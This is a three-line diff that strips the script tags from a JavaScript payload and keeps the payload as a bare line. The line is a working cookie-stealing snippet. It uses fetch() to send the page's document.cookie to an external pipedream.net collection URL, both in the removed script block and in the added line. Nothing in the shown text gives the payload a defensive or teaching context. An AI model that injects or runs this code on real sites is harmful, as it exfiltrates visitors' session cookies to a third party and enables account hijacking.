@@ -1,3 +1,1 @@
-<script>
-  fetch("https://eo9wi2irr08frfs.m.pipedream.net/?cookie=" + document.cookie);
-</script>
+fetch("https://eo9wi2irr08frfs.m.pipedream.net/?cookie=" + document.cookie);
